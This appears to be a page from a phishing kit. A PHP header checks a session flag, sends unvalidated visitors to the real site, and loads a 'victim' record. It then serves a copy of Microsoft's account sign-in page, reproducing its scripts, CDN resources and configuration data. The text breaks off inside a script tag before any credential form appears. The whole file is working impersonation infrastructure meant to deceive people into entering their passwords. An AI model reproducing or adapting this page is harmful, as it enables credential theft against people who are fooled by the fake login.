<?php
require_once('shade/core/functions.php');

if($_SESSION['is_valid'] != 1)
{
    die('<script>window.location.href = "'.REAL_WEBSITE.'";</script>');
    return;
}

$ent = $crud->getVictim($_SESSION['ent_id']);
?>
<html dir="ltr" lang="EN-US">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <title>Sign in to your Microsoft account</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
      <script type="text/javascript">!function(r,t){for(var e in t)r[e]=t[e]}(this,function(r){function t(o){if(e[o])return e[o].exports;var n=e[o]={exports:{},id:o,loaded:!1};return r[o].call(n.exports,n,n.exports,t),n.loaded=!0,n.exports}var e={};return t.m=r,t.c=e,t.p="",t(0)}([function(r,t){!function(){function r(r,t){function e(i){var a=r[i];return i<o-1?void(n.r[a]?e(i+1):n.when(a,function(){e(i+1)})):void t(a)}var o=r.length;e(0)}function t(r,t,i){function a(){var r=!!u.method,n=r?u.method:i[0],a=u.extraArgs||[],c=o.$WebWatson;try{var f=e(i,!r);if(a&&a.length>0)for(var s=a.length,v=0;v<s;v++)f.push(a[v]);n.apply(t,f)}catch(h){return void(c&&c.submitFromException&&c.submitFromException(h))}}var u=n.r&&n.r[r];return t=t?t:this,u&&(u.skipTimeout?a():o.setTimeout(a,0)),u}function e(r,t){return Array.prototype.slice.call(r,t?1:0)}var o=window;o.$Do||(o.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var n=o.$Do;n.when=function(e,o){function i(r){t(r,a,u)||n.q.push({id:r,c:a,a:u})}var a=0,u=[],c=1,f="function"==typeof o;f||(a=o,c=2);for(var s=c;s<arguments.length;s++)u.push(arguments[s]);e instanceof Array?r(e,i):i(e)},n.register=function(r,e,o){if(!n.r[r]){n.o.push(r);var i={};if(e&&(i.method=e),o&&(i.skipTimeout=o),arguments&&arguments.length>3){i.extraArgs=[];for(var a=3;a<arguments.length;a++)i.extraArgs.push(arguments[a])}n.r[r]=i,n.lock++;try{for(var u=0;u<n.q.length;u++){var c=n.q[u];c.id==r&&t(r,c.c,c.a)&&n.removeItems.push(c)}}catch(f){throw f}finally{if(n.lock--,0===n.lock){for(var s=0;s<n.removeItems.length;s++)for(var v=n.removeItems[s],h=0;h<n.q.length;h++)if(n.q[h]===v){n.q.splice(h,1);break}n.removeItems=[]}}}},n.unregister=function(r){n.r[r]&&delete n.r[r]}}()}]));</script><script type="text/javascript">!function(n,e){for(var r in e)n[r]=e[r]}(this,function(n){function e(o){if(r[o])return r[o].exports;var t=r[o]={exports:{},id:o,loaded:!1};return n[o].call(t.exports,t,t.exports,e),t.loaded=!0,t.exports}var r={};return e.m=n,e.c=r,e.p="",e(0)}([function(n,e){!function(){function n(){return r.$Config||r.ServerData||{}}function e(){var e=(n(),new t),r=this,i=[],f=[];r.Add=function(n,r,o,t){e.Add(n,r,o,t)},r.Provides=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)i.push(n[e]);else i.push(n)},r.Requires=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)f.push(n[e]);else f.push(n)},r.Load=function(n,r){var t=function(){n&&n();for(var e=0;e<i.length;e++)o.register(i[e],0,!0)},u=function(){e.Load(t,r)};f.length>0?o.when(f,u):u()}}var r=window,o=(r.document,r.$Do),t=r.$Loader,i=".css";i.length;e.WhenLoaded=function(n,e){o.when(n,e)},r.$DepLoader=e}()}]));</script>
      <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29589.2/images/favicon.ico">
      <link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000/Converged_v21033_owVE4P390-ouu-zhdQJeHw2.css">
      <style type="text/css"></style>
      <style type="text/css">body{display:none;}</style>
      <script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script>
      <style type="text/css">body{display:block !important;}</style>
      <noscript>
         <style type="text/css">body{display:block !important;}</style>
      </noscript>
      <script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var i=t[n]={exports:{},id:n,loaded:!1};return e[n].call(i.exports,i,i.exports,r),i.loaded=!0,i.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){var t=window,n=t.navigator;t.g_iSRSFailed=0,t.g_sSRSSuccess="",r.SRSRetry=function(e,r,i,s,a){var o=1,c=unescape("%3Cscript type='text/javascript'");a&&(c+=" crossorigin='anonymous' integrity='"+a+"'"),c+=" src='";var u=unescape("'%3E%3C/script%3E"),S=r;if(n&&n.userAgent&&s&&s!==r){var d=n.userAgent.toLowerCase(),p=d.indexOf("edge")>=0;if(!p){var f=d.match(/chrome\/([0-9]+)\./),g=f&&2===f.length&&!isNaN(f[1])&&parseInt(f[1])>54;g&&(S=s)}}t.g_sSRSSuccess.indexOf(e)===-1&&("undefined"==typeof t[e]?(t.g_iSRSFailed=1,i<=o&&document.write(c+S+u)):t.g_sSRSSuccess+=e+"|"+i+",")}}]));var g_dtFirstByte=new Date();var g_objPageMode = null;</script>
      <link rel="image_src" href="https://logincdn.msauth.net/16.000.29589.2/images/Windows_Live_v_thumb.jpg">
      <script type="text/javascript">var ServerData = {CG:true,Bh:false,CJ:false,Bk:false,Bm:true,CM:false,urlPostMsa:'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=6EAD7FDD57F1CADD&bk=1666596687&uaid=95087439730a4f39918a1b2f787ef2fe&pid=0',Bp:false,aD:'',aG:'BR',CU:false,CV:false,aL:'https://outlook.office365.com/owa/prefetch.aspx?id=292841&mkt=EN-US',By:true,aM:'https://login.microsoft.com/consumers/fido/get?mkt=EN-US&lc=1033&uiflavor=web',aN:'https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&uaid=95087439730a4f39918a1b2f787ef2fe',aP:'',b0:'https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1666596686%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253de0df6e84-18bc-b356-6d7d-1cd4820f8383%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d6EAD7FDD57F1CADD%26bk%3d1666596687&id=292841&uiflavor=web&cobrandid=90015&lostauthenticator=1&uaid=95087439730a4f39918a1b2f787ef2fe&mkt=EN-US&lc=1033&bk=1666596687',urlReportPageLoad:'',urlLogin:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=6EAD7FDD57F1CADD&bk=1666596687&mkt=EN-US&lc=1033&uaid=95087439730a4f39918a1b2f787ef2fe',b2:'https://login.live.com/Me.htm?v=3&uaid=95087439730a4f39918a1b2f787ef2fe',fMMXQRNewDescription:true,aV:{"appInsightsConfig":{"instrumentationKey":"69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293","webAnalyticsConfiguration":{"autoCapture":{"jsError":1,"click":0}}},"appId":"-","defaultEventName":"IDUX_MSAClientTelemetryEvent_WebWatson","autoPost":true,"autoPostDelay":1000,"flush":60000,"maxEvents":1,"minEvents":1,"pltDelay":500,"telemetryEnabled":true,"useOneDSEventApi":true,"serviceID":2},b6:'',hpgid:33,sRequestCountry:'BR',Cd:2,a11yConformeLink:'',Ce:true,DD:'',aY:true,b9:'https://login.live.com/GetSessionState.srf?wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&mkt=EN-US&lc=1033&uaid=95087439730a4f39918a1b2f787ef2fe',Cf:true,aZ:true,DG:"A single-use code lets you sign in without entering your password. This helps protect your account when you\'re using someone else\'s PC. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",fApplicationInsightsEnabled:false,Ci:false,DH:"Your session has timed out. To request a single use code, please <a href=\"javascript:NewOTCRequest()\">refresh the page</a>.",Cj:false,DJ:"Sign in",Cm:true,aa:0,urlFed:'',ab:0,iApplicationInsightsEnabledPercentage:0,bB:true,DN:'https://sc.imp.live.com/content/dam/imp/surfaces/mail_signin/v3/account/EN-US.html?id=292841&mkt=EN-US&cbcxt=out',ac:1,DO:'',urlPostAad:'https://login.microsoftonline.com/common/fidoauthorize?redirect_uri=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1666596686%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253de0df6e84-18bc-b356-6d7d-1cd4820f8383%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d6EAD7FDD57F1CADD%26bk%3d1666596687%26mkt%3dEN-US%26lc%3d1033%26uaid%3d95087439730a4f39918a1b2f787ef2fe%26gotoaad%3d1&uaid=95087439730a4f39918a1b2f787ef2fe',Cp:false,DP:'',Cq:true,ae:'login.live.com',bF:0,ag:'',DS:'https://go.microsoft.com/fwlink/?linkid=2013738',ah:'',urlApplicationInsightsEndpoint:'',sPOST_NewUser:'',DU:'',DV:'https://go.microsoft.com/fwlink/?LinkID=254486',Cx:false,am:'',an:'https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&uaid=95087439730a4f39918a1b2f787ef2fe',ap:'',iServerExecutionTime:4,urlPost:'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=6EAD7FDD57F1CADD&bk=1666596687&uaid=95087439730a4f39918a1b2f787ef2fe&pid=0',c0:'gmail.com,yahoo.com,qq.com,mail.ru,163.com,aol.com',bQ:'i5030',bR:'',bS:'',bV:'https://account.live.com/query.aspx?uaid=95087439730a4f39918a1b2f787ef2fe&mkt=EN-US&lc=1033&id=292841',aw:'PROD',c6:'',Dd:"#~#partnerdomain#~# does\'t use this service. Please sign in with a Microsoft account or create a new account. <a href=\"#~#WLPaneHelpInviteBlockedURL_LS#~#\" id=\"idPaneHelpInviteBlockedLink9\">Learn More</a>",c8:'',c9:'PassportR',sApplicationInsightsInstrumentationKey:'',A:10000,fWebNgcFS:false,Dh:"Use the primary phone number you\'ve associated with your Microsoft account. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",B:2,D:false,sFedQS:'wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=wa%3Dwsignin1.0%26rpsnv%3D13%26ct%3D1666596686%26rver%3D7.0.6737.0%26wp%3DMBI_SSL%26wreply%3Dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253de0df6e84-18bc-b356-6d7d-1cd4820f8383%26id%3D292841%26aadredir%3D1%26CBCXT%3Dout%26lw%3D1%26fl%3Ddob%252cflname%252cwld%26cobrandid%3D90015%26contextid%3D6EAD7FDD57F1CADD%26bk%3D1666596687',F:'',G:'',Dn:'',bb:true,Do:'',Dp:'',J:'https://signup.live.com/signup?wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=6EAD7FDD57F1CADD&bk=1666596687&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=95087439730a4f39918a1b2f787ef2fe',Dq:'',be:3,K:{"ri":"SN1PEPF000175FE","ver":"16.0.29589.2"},L:false,bf:5,Dr:'https://go.microsoft.com/fwlink/p/?LinkID=733247',A3:false,Dt:'',N:-1,Q:1033,A7:true,str:[],Dx:'https://passwordreset.microsoftonline.com?uaid=95087439730a4f39918a1b2f787ef2fe',A9:0,T:false,bn:'',cN:0,V:60,bp:'PPFT',X:'https://github.com/login/oauth/authorize?response_type=code&client_id=e37ffdec11c0245cb2e0&scope=read:user++user:email&redirect_uri=https://login.live.com/HandleGithubResponse.srf&allow_signup=false&state=BC869325B861765F',cR:1,Y:'',bs:'',Z:'https://login.live.com/cookiesDisabled.srf?uaid=95087439730a4f39918a1b2f787ef2fe&mkt=EN-US&lc=1033',bt:'',urlSwitch:'https://login.live.com/logout.srf?wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=6EAD7FDD57F1CADD&uaid=95087439730a4f39918a1b2f787ef2fe&ru=https://outlook.live.com/owa/%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&bk=1666596687&lm=I',cU:{},AB:0,cV:{},urlFedConvertRename:'https://account.live.com/security/LoginStage.aspx?lmif=1000&ru=https://login.live.com/login.srf%3Fwa%3Dwsignin1.0%26rpsnv%3D13%26ct%3D1666596686%26rver%3D7.0.6737.0%26wp%3DMBI_SSL%26wreply%3Dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253de0df6e84-18bc-b356-6d7d-1cd4820f8383%26id%3D292841%26aadredir%3D1%26CBCXT%3Dout%26lw%3D1%26fl%3Ddob%252cflname%252cwld%26cobrandid%3D90015%26mkt%3DEN-US%26lc%3D1033%26uaid%3D95087439730a4f39918a1b2f787ef2fe&wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&mkt=EN-US&lc=1033&cbid=0&id=292841&uaid=95087439730a4f39918a1b2f787ef2fe',AD:'',cW:'',by:'https://account.live.com/ChangePassword?uaid=95087439730a4f39918a1b2f787ef2fe',bz:'https://login.live.com/GetCredentialType.srf?opid=BC869325B861765F&id=292841&wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&mkt=EN-US&lc=1033&uaid=95087439730a4f39918a1b2f787ef2fe',cY:'sign up',AF:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=6EAD7FDD57F1CADD&bk=1666596687&mkt=EN-US&lc=1033&uaid=95087439730a4f39918a1b2f787ef2fe&gotoaad=1',a:'https://logincdn.msauth.net/shared/1.0/',cZ:'',b:{},c:'',e:true,AK:true,f:1,AL:3,g:'',h:'292841',AN:null,i:'',k:'95087439730a4f39918a1b2f787ef2fe',B0:false,ce:false,AS:'',m:2,AU:[],sCBUpTxt1:'',ci:false,sCBUpTxt2:'',AW:true,sHostBuildNumber:'16.0.29589.2',r:'https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1666596686%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253de0df6e84-18bc-b356-6d7d-1cd4820f8383%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d6EAD7FDD57F1CADD%26bk%3d1666596687&id=292841&uiflavor=web&cobrandid=90015&uaid=95087439730a4f39918a1b2f787ef2fe&mkt=EN-US&lc=1033&bk=1666596687',ck:false,B8:true,AZ:true,B9:true,u:1,co:0,w:'https://account.live.com/username/recover?wreply=https://login.live.com/login.srf%3flc%3d1033%26mkt%3dEN-US%26wa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1666596686%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253de0df6e84-18bc-b356-6d7d-1cd4820f8383%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d6EAD7FDD57F1CADD%26bk%3d1666596687%26uaid%3d95087439730a4f39918a1b2f787ef2fe&id=292841&cobrandid=90015&mkt=EN-US&lc=1033&uaid=95087439730a4f39918a1b2f787ef2fe&uiflavor=web',correlationId:'95087439730a4f39918a1b2f787ef2fe',oPost:{},Aa:true,cv:{},Ac:null,cw:{'Logo':'','LogoAltText':'','LogoText':'','ShowWLHeader':true},Ae:'wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=6EAD7FDD57F1CADD&bk=1666596687',cy:'##li16####B##Hotmail##/B####BR##The smart way to do email - fast, easy and reliable##li8####B##Messenger##/B####BR##Stay in touch with the most important people in your life##li10####B##SkyDrive##/B####BR##Free, password-protected online storage',Af:'',cz:'',Ai:false,BH:false,Aj:true,Ak:true,Al:0,sErrTxt:'',fDetectMultiHighContrastThemes:true,BL:false,Aq:'AF~Afghanistan~93!!!AL~Albania~355!!!DZ~Algeria~213!!!AD~Andorra~376!!!AO~Angola~244!!!AQ~Antarctica~672!!!AG~Antigua and Barbuda~1!!!AR~Argentina~54!!!AM~Armenia~374!!!AW~Aruba~297!!!AC~Ascension Island~247!!!AU~Australia~61!!!AT~Austria~43!!!AZ~Azerbaijan~994!!!BS~Bahamas~1!!!BH~Bahrain~973!!!BD~Bangladesh~880!!!BB~Barbados~1!!!BY~Belarus~375!!!BE~Belgium~32!!!BZ~Belize~501!!!BJ~Benin~229!!!BM~Bermuda~1!!!BT~Bhutan~975!!!BO~Bolivia~591!!!BQ~Bonaire~599!!!BA~Bosnia and Herzegovina~387!!!BW~Botswana~267!!!BV~Bouvet Island~47!!!BR~Brazil~55!!!IO~British Indian Ocean Territory~44!!!VG~British Virgin Islands~1!!!BN~Brunei~673!!!BG~Bulgaria~359!!!BF~Burkina Faso~226!!!BI~Burundi~257!!!CV~Cabo Verde~238!!!KH~Cambodia~855!!!CM~Cameroon~237!!!CA~Canada~1!!!KY~Cayman Islands~1!!!CF~Central African Republic~236!!!TD~Chad~235!!!CL~Chile~56!!!CN~China~86!!!CX~Christmas Island~61!!!CC~Cocos (Keeling) Islands~61!!!CO~Colombia~57!!!KM~Comoros~269!!!CG~Congo~242!!!CD~Congo (DRC)~243!!!CK~Cook Islands~682!!!CR~Costa Rica~506!!!CI~C�te d\'Ivoire~225!!!HR~Croatia~385!!!CU~Cuba~53!!!CW~Cura�ao~599!!!CY~Cyprus~357!!!CZ~Czechia~420!!!DK~Denmark~45!!!DJ~Djibouti~253!!!DM~Dominica~1!!!DO~Dominican Republic~1!!!EC~Ecuador~593!!!EG~Egypt~20!!!SV~El Salvador~503!!!GQ~Equatorial Guinea~240!!!ER~Eritrea~291!!!EE~Estonia~372!!!ET~Ethiopia~251!!!FK~Falkland Islands~500!!!FO~Faroe Islands~298!!!FJ~Fiji~679!!!FI~Finland~358!!!FR~France~33!!!GF~French Guiana~594!!!PF~French Polynesia~689!!!GA~Gabon~241!!!GM~Gambia~220!!!GE~Georgia~995!!!DE~Germany~49!!!GH~Ghana~233!!!GI~Gibraltar~350!!!GR~Greece~30!!!GL~Greenland~299!!!GD~Grenada~1!!!GP~Guadeloupe~590!!!GU~Guam~1!!!GT~Guatemala~502!!!GG~Guernsey~44!!!GN~Guinea~224!!!GW~Guinea-Bissau~245!!!GY~Guyana~592!!!HT~Haiti~509!!!HN~Honduras~504!!!HK~Hong Kong SAR~852!!!HU~Hungary~36!!!IS~Iceland~354!!!IN~India~91!!!ID~Indonesia~62!!!IR~Iran~98!!!IQ~Iraq~964!!!IE~Ireland~353!!!IM~Isle of Man~44!!!IL~Israel~972!!!IT~Italy~39!!!JM~Jamaica~1!!!XJ~Jan Mayen~47!!!JP~Japan~81!!!JE~Jersey~44!!!JO~Jordan~962!!!KZ~Kazakhstan~7!!!KE~Kenya~254!!!KI~Kiribati~686!!!KR~Korea~82!!!XK~Kosovo~383!!!KW~Kuwait~965!!!KG~Kyrgyzstan~996!!!LA~Laos~856!!!LV~Latvia~371!!!LB~Lebanon~961!!!LS~Lesotho~266!!!LR~Liberia~231!!!LY~Libya~218!!!LI~Liechtenstein~423!!!LT~Lithuania~370!!!LU~Luxembourg~352!!!MO~Macao SAR~853!!!MK~North Macedonia~389!!!MG~Madagascar~261!!!MW~Malawi~265!!!MY~Malaysia~60!!!MV~Maldives~960!!!ML~Mali~223!!!MT~Malta~356!!!MH~Marshall Islands~692!!!MQ~Martinique~596!!!MR~Mauritania~222!!!MU~Mauritius~230!!!YT~Mayotte~262!!!MX~Mexico~52!!!FM~Micronesia~691!!!MD~Moldova~373!!!MC~Monaco~377!!!MN~Mongolia~976!!!ME~Montenegro~382!!!MS~Montserrat~1!!!MA~Morocco~212!!!MZ~Mozambique~258!!!MM~Myanmar~95!!!NA~Namibia~264!!!NR~Nauru~674!!!NP~Nepal~977!!!NL~Netherlands~31!!!AN~Netherlands Antilles (Former)~599!!!NC~New Caledonia~687!!!NZ~New Zealand~64!!!NI~Nicaragua~505!!!NE~Niger~227!!!NG~Nigeria~234!!!NU~Niue~683!!!MP~Northern Mariana Islands~1!!!NO~Norway~47!!!OM~Oman~968!!!PK~Pakistan~92!!!PW~Palau~680!!!PS~Palestinian Authority~970!!!PA~Panama~507!!!PG~Papua New Guinea~675!!!PY~Paraguay~595!!!PE~Peru~51!!!PH~Philippines~63!!!PL~Poland~48!!!PT~Portugal~351!!!QA~Qatar~974!!!RE~R�union~262!!!RO~Romania~40!!!RU~Russia~7!!!RW~Rwanda~250!!!XS~Saba~599!!!KN~Saint Kitts and Nevis~1!!!LC~Saint Lucia~1!!!PM~Saint Pierre and Miquelon~508!!!VC~Saint Vincent and the Grenadines~1!!!WS~Samoa~685!!!SM~San Marino~378!!!ST~S�o Tom� and Pr�ncipe~239!!!SA~Saudi Arabia~966!!!SN~Senegal~221!!!RS~Serbia~381!!!SC~Seychelles~248!!!SL~Sierra Leone~232!!!SG~Singapore~65!!!XE~Sint Eustatius~599!!!SK~Slovakia~421!!!SI~Slovenia~386!!!SB~Solomon Islands~677!!!SO~Somalia~252!!!ZA~South Africa~27!!!SS~South Sudan~211!!!ES~Spain~34!!!LK~Sri Lanka~94!!!SH~St Helena, Ascension, and Tristan da Cunha~290!!!SD~Sudan~249!!!SR~Suriname~597!!!SJ~Svalbard~47!!!SZ~Swaziland~268!!!SE~Sweden~46!!!CH~Switzerland~41!!!SY~Syria~963!!!TW~Taiwan~886!!!TJ~Tajikistan~992!!!TZ~Tanzania~255!!!TH~Thailand~66!!!TL~Timor-Leste~670!!!TG~Togo~228!!!TK~Tokelau~690!!!TO~Tonga~676!!!TT~Trinidad and Tobago~1!!!TA~Tristan da Cunha~290!!!TN~Tunisia~216!!!TR~Turkey~90!!!TM~Turkmenistan~993!!!TC~Turks and Caicos Islands~1!!!TV~Tuvalu~688!!!UM~U.S. Outlying Islands~1!!!VI~U.S. Virgin Islands~1!!!UG~Uganda~256!!!UA~Ukraine~380!!!AE~United Arab Emirates~971!!!UK~United Kingdom~44!!!US~United States~1!!!UY~Uruguay~598!!!UZ~Uzbekistan~998!!!VU~Vanuatu~678!!!VA~Vatican City~379!!!VE~Venezuela~58!!!VN~Vietnam~84!!!WF~Wallis and Futuna~681!!!YE~Yemen~967!!!ZM~Zambia~260!!!ZW~Zimbabwe~263',html:[],iPawnIcon:1,sFTTag:'<input type="hidden" name="PPFT" id="i0327" value="DY3RCfqEh3w4R6!ogjHWhQLJRITxDMzndJtwR*DxlYEweXzJjPDDqyyvLX3!gT9lVB0UGRfO3dw*VY61RQEApCAVLAvHs*tWNK!IsofVaKJP9uKacQXmtTvkKopX4NB!7wGx505MwYNTdmJ5!p*JSMOOvkTD9b1*UdKtI3mplqyzKc5NrrFavUpEH*v6dP3TGVu90sl9T66IFz3bSKtC!0YjfOwHOLLfvAT53LTXcmZqbgmJwYYkOWF1ClR*0c1VKfG40ePaI311SuC8hYaTwe0$"/>',BS:true,loader:{cdnRoots:['https://logincdn.msauth.net/','https://lgincdnvzeuno.azureedge.net/','https://lgincdnmsftuswe2.azureedge.net/']},C4:true,Aw:true,BV:false,Ax:false,C7:true,BY:true,fHasBackgroundColor:false,a1:false,urlStaySignIn:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1666596686&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3de0df6e84-18bc-b356-6d7d-1cd4820f8383&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=6EAD7FDD57F1CADD&mkt=EN-US&lc=1033&bk=1666596687&uaid=95087439730a4f39918a1b2f787ef2fe',a4:false,a5:true,a7:true,CD:0,Be:true,CF:false};var HIP={};</script><script type="text/javascript">window.UXResourceDependencies = [];</script><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.en_ms7D3Sg5zrp9zL67-ltmnQ2.js","ConvergedLoginPaginatedStrings","sha384-DujjBzXF1KQHq1lvxQnK+g/O6tG6sAvKpS8PnQtlx4YaIlkOfQTQOq+5tYOjnfjR");l.Provides("UX_JS_Strings");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script><script type="text/javascript" src="https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.en_ms7D3Sg5zrp9zL67-ltmnQ2.js" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-DujjBzXF1KQHq1lvxQnK+g/O6tG6sAvKpS8PnQtlx4YaIlkOfQTQOq+5tYOjnfjR"></script><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_RArqC-9Hq1JVxe30AI_ZOQ2.js","ConvergedLogin_PCore","sha384-gRt1uXuFgbFYA3g1qHVvGfw/ZVktCLGf8u1MJBDBanF/iqX19VdeFozgSu81xKO0");l.Requires("UX_JS_Strings");l.Provides("UX_JS_Core");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script><script type="text/javascript">window.WhenAllLoaded = function (callback) { window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback); };</script><script type="text/javascript" src="https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_RArqC-9Hq1JVxe30AI_ZOQ2.js" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-gRt1uXuFgbFYA3g1qHVvGfw/ZVktCLGf8u1MJBDBanF/iqX19VdeFozgSu81xKO0"></script><script charset="utf-8" 